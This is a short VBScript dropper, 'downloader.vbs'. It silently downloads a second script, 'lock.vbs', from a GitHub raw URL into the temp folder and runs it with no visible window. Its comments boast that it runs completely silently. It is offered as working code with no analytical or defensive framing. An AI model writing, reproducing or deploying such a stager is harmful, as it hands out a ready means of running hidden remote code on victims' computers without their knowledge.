' downloader.vbs - Completely silent, no windows at all
Dim url, tempFolder, tempFile, objXML, objStream

url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/lock.vbs"
tempFolder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
tempFile = tempFolder & "\lock.vbs"

' Download the file
Set objXML = CreateObject("MSXML2.XMLHTTP")
objXML.Open "GET", url, False
objXML.Send

If objXML.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objXML.ResponseBody
    objStream.SaveToFile tempFile, 2
    objStream.Close
    Set objStream = Nothing
End If

Set objXML = Nothing

' Run the downloaded script (NO WINDOW)
CreateObject("WScript.Shell").Run """" & tempFile & """", 0, False
